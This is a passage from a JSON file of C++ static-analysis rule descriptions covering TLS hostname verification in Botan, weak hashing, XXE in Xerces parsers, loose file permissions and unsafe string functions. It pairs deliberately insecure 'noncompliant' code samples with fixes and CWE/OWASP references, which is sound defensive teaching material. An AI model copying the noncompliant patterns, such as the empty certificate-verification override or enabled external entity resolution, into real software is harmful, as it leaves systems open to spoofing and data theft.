href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf\">NIST 800-131A</a> - Recommendation for Transitioning the\n  Use of Cryptographic Algorithms and Key Lengths </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S5527": {
        "name": "Server hostnames should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability allows attackers to impersonate a trusted host.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this\nprocess, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding\nan extra layer of trust and security.</p>\n<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity\nand intercept, manipulate, or steal the data being transmitted.</p>\n<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the\napplication code would still accept it.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build\nthis trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit\nthis by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,\ntricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data\nyour system sends to them, potentially leading to significant data breaches.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to\nuse the original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks\n{\n    virtual void tls_verify_cert_chain(\n              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,\n              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,\n              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,\n              Botan::Usage_Type usage,\n              const std::string &amp;hostname,\n              const Botan::TLS::Policy &amp;policy)\n    override  { }\n};\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks { };\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around\nanother system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the system’s trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://botan.randombit.net/handbook/\">Botan</a> - Handbook </li>\n  <li> <a href=\"https://www.feistyduck.com/books/openssl-cookbook/\">OpenSSL</a> - Cookbook </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/297\">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;botan/hash.h&gt;\n// ...\n\nBotan::secure_vector&lt;uint8_t&gt; f(std::string input){\n    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(\"MD5\")); // Sensitive\n    return hash-&gt;process(input);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;botan/hash.h&gt;\n// ...\n\nBotan::secure_vector&lt;uint8_t&gt; f(std::string input){\n    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create(\"SHA-512\")); // Compliant\n    return hash-&gt;process(input);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S2755": {
        "name": "XML parsers should not be vulnerable to XXE attacks",
        "htmlDesc": "<p>This vulnerability allows the usage of external entities in XML.</p>\n<h2>Why is this an issue?</h2>\n<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without\nproper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exposing sensitive data</h4>\n<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can\nreference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these\nentities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe\nthreat to the confidentiality of critical information.</p>\n<h4>Exhausting system resources</h4>\n<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,\nattackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading\nto system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>\n<h4>Forging requests</h4>\n<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker\ncan make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as\nretrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,\nincluding unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>\n<h2>How to fix it in Xerces</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n#include \"xercesc/parsers/XercesDOMParser.hpp\"\n\nvoid parse() {\n  XercesDOMParser *DOMparser = new XercesDOMParser();\n  DOMparser-&gt;setCreateEntityReferenceNodes(false); // Noncompliant\n  DOMparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant\n\n  DOMparser-&gt;parse(xmlFile);\n}\n</pre>\n<p>By default, entities resolution is enabled for <code>XMLReaderFactory::createXMLReader</code>.</p>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\n#include \"xercesc/sax2/SAX2XMLReader.hpp\"\n\nvoid parse() {\n  SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();\n  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, false); // Noncompliant\n\n  reader-&gt;parse(xmlFile);\n}\n</pre>\n<p>By default, entities resolution is enabled for <code>SAXParser</code>.</p>\n<pre data-diff-id=\"13\" data-diff-type=\"noncompliant\">\n#include \"xercesc/parsers/SAXParser.hpp\"\n\nvoid parse() {\n  SAXParser* SAXparser = new SAXParser();\n  SAXparser-&gt;setDisableDefaultEntityResolution(false); // Noncompliant\n\n  SAXparser-&gt;parse(xmlFile);\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>By default, <code>XercesDOMParser</code> is safe.</p>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n#include \"xercesc/parsers/XercesDOMParser.hpp\"\n\nvoid parse() {\n  XercesDOMParser *DOMparser = new XercesDOMParser();\n  DOMparser-&gt;setCreateEntityReferenceNodes(true);\n  DOMparser-&gt;setDisableDefaultEntityResolution(true);\n\n  DOMparser-&gt;parse(xmlFile);\n}\n</pre>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\n#include \"xercesc/sax2/SAX2XMLReader.hpp\"\n\nvoid parse() {\n  SAX2XMLReader* reader = XMLReaderFactory::createXMLReader();\n  reader-&gt;setFeature(XMLUni::fgXercesDisableDefaultEntityResolution, true);\n\n  reader-&gt;parse(xmlFile);\n}\n</pre>\n<pre data-diff-id=\"13\" data-diff-type=\"compliant\">\n#include \"xercesc/parsers/SAXParser.hpp\"\n\nvoid parse() {\n  SAXParser* SAXparser = new SAXParser();\n  SAXparser-&gt;setDisableDefaultEntityResolution(true);\n\n  SAXparser-&gt;parse(xmlFile);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "cpp:S2612": {
        "name": "Setting loose POSIX file permissions is security-sensitive",
        "htmlDesc": "<p>In Unix file system permissions, the \"<code>others</code>\" category refers to all users except the owner of the file system resource and the\nmembers of the group assigned to this resource.</p>\n<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive\ninformation, disrupt services or elevate privileges.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application is designed to be run on a multi-user environment. </li>\n  <li> Corresponding files and directories may contain confidential information. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The most restrictive possible permissions should be assigned to files and directories.</p>\n<h2>Sensitive Code Example</h2>\n<p>When creating a file or directory with permissions to \"other group\":</p>\n<pre>\nopen(\"myfile.txt\", O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this newly created file\n\nmkdir(\"myfolder\", S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process try to set 777 permissions to this newly created directory\n</pre>\n<p>When explicitly adding permissions to \"other group\" with <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code>\nfunctions:</p>\n<pre>\nchmod(\"myfile.txt\", S_IRWXU | S_IRWXG | S_IRWXO);  // Sensitive: the process set 777 permissions to this file\n\nfchmod(fd, S_IRWXU | S_IRWXG | S_IRWXO); // Sensitive: the process set 777 permissions to this file descriptor\n</pre>\n<p>When defining the <code>umask</code> without read, write and execute permissions for \"other group\":</p>\n<pre>\numask(S_IRWXU | S_IRWXG); // Sensitive: the further files and folders will be created with possible permissions to \"other group\"\n</pre>\n<h2>Compliant Solution</h2>\n<p>When creating a file or directory, do not set permissions to \"other group\":</p>\n<pre>\nopen(\"myfile.txt\", O_CREAT, S_IRWXU | S_IRWXG); // Compliant\n\nmkdir(\"myfolder\", S_IRWXU | S_IRWXG); // Compliant\n</pre>\n<p>When using <code>chmod</code>, <code>fchmod</code> or <code>filesystem::permissions</code> functions, do not add permissions to \"other group\":</p>\n<pre>\nchmod(\"myfile.txt\", S_IRWXU | S_IRWXG);  // Compliant\n\nfchmod(fd, S_IRWXU | S_IRWXG); // Compliant\n</pre>\n<p>When defining the <code>umask</code>, set read, write and execute permissions to other group:</p>\n<pre>\numask(S_IRWXO); // Compliant: further created files or directories will not have permissions set for \"other group\"\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> <a\n  href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission\">OWASP File Permission</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/266\">CWE-266 - Incorrect Privilege Assignment</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO06-C.+Create+files+with+appropriate+access+permissions\">CERT, FIO06-C.</a> - Create\n  files with appropriate access permissions </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cpp:S5813": {
        "name": "Using \"strlen\" or \"wcslen\" is security-sensitive",
        "htmlDesc": "<p>The function <code>size_t strlen(const char *s)</code> measures the length of the string <code>s</code> (excluding the final null character).<br>\nThe function <code>size_t wcslen(const wchar_t *s)</code> does the same for wide characters, and should be used with the same guidelines.</p>\n<p>Similarly to many other functions in the standard C libraries, <code>strlen</code> and <code>wcslen</code> assume that their argument is not a null\npointer.</p>\n<p>Additionally, they expect the strings to be null-terminated. For example, the 5-letter string \"abcde\" must be stored in memory as \"abcde\\0\" (i.e.\nusing 6 characters) to be processed correctly. When a string is missing the null character at the end, these functions will iterate past the end of\nthe buffer, which is undefined behavior.</p>\n<p>Therefore, string parameters must end with a proper null character. The absence of this particular character can lead to security vulnerabilities\nthat allow, for example, access to sensitive data or the execution of arbitrary code.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that the pointer is null. </li>\n  <li> There is a possibility that the string is not correctly null-terminated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use safer functions. The C11 functions <code>strlen_s</code> and <code>wcslen_s</code> from annex K handle typical programming errors.<br>\n  Note, however, that they have a runtime overhead and require more code for error handling and therefore are not suited to every case. </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions. </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nsize_t f(char *src) {\n  char dest[256];\n  strncpy(dest, src, sizeof dest); // Truncation may happen\n  return strlen(dest); // Sensitive: \"dest\" will not be null-terminated if truncation happened\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsize_t f(char *src) {\n  char dest[256];\n  strncpy(dest, src, sizeof dest); // Truncation may happen\n  dest[sizeof dest - 1] = 0;\n  return strlen(dest); // Compliant: \"dest\" is guaranteed to be null-terminated\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cpp:S5814": {
        "name": "Using \"strcat\" or \"wcscat\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strcat( char *restrict dest, const char *restrict src );</code> appends the characters of string <code>src</code> at the\nend of <code>dest</code>. The <code>wcscat</code> does the same for wide characters and should be used with the same guidelines.</p>\n<p>Note: the functions <code>strncat</code> and <code>wcsncat</code> might look like attractive safe replacements for <code>strcat</code> and\n<code>wcscaty</code>, but they have their own set of issues (see <a href='/coding_rules#rule_key=cpp%3AS5815'>S5815</a>), and you should probably prefer another more adapted\nalternative.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>\n  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final&nbsp;<code>null</code>\n  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>\n  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strcat_s</code> and the <code>wcscat_s</code> that were designed as safer alternatives to\n  <code>strcat</code> and <code>wcscat</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strcpy(dest, \"Result: \");\n  strcat(dest, src); // Sensitive: might overflow\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char result[] = \"Result: \";\n  char *dest = malloc(sizeof(result) + strlen(src)); // Not need of +1 for final 0 because sizeof will already count one 0\n  strcpy(dest, result);\n  strcat(dest, src); // Compliant: the buffer size was carefully crafted\n  int r = doSomethingWith(dest);\n  free(dest);\n  return r;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cpp:S5815": {
        "name": "Using \"strncat\" or \"wcsncat\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strncat( char *restrict dest, const char *restrict src, size_t count );</code> appends the characters of string\n<code>src</code> at the end of <code>dest</code>, but only add <code>count</code> characters max. <code>dest</code> will always be\n<code>null</code>-terminated. The <code>wcsncat</code> does the same for wide characters, and should be used with the same guidelines.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the <code>src</code> or the <code>dest</code> pointer is <code>null</code> </li>\n  <li> The current string length of <code>dest</code> plus the current string length of <code>src</code> plus 1 (for the final <code>null</code>\n  character) is larger than the size of the buffer pointer-to by <code>src</code> </li>\n  <li> There is a possibility that either string is not correctly <code>null</code>-terminated </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strncat_s</code> and the <code>wcsncat_s</code> that were designed as safer alternatives to\n  <code>strncat</code> and <code>wcsncat</code>. It’s not recommended to use them in all circumstances because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>\n  <li> If you are using <code>strncat</code> and <code>wsncat</code> as a safer version of <code>strcat</code> and <code>wcscat</code>, you should\n  instead consider <code>strcat_s</code> and <code>wcscat_s</code> because these functions have several shortcomings:\n    <ul>\n      <li> It’s not easy to detect truncation </li>\n      <li> The <code>count</code> parameter is error-prone </li>\n      <li> Computing the <code>count</code> parameter typically requires computing the string length of <code>dest</code>, at which point other\n      simpler alternatives exist </li>\n    </ul>  </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strcpy(dest, \"Result: \");\n  strncat(dest, src, sizeof dest); // Sensitive: passing the buffer size instead of the remaining size\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char result[] = \"Result: \";\n  char dest[256];\n  strcpy(dest, result);\n  strncat(dest, src, sizeof dest - sizeof result); // Compliant but may silently truncate\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cpp:S5816": {
        "name": "Using \"strncpy\" or \"wcsncpy\" is security-sensitive",
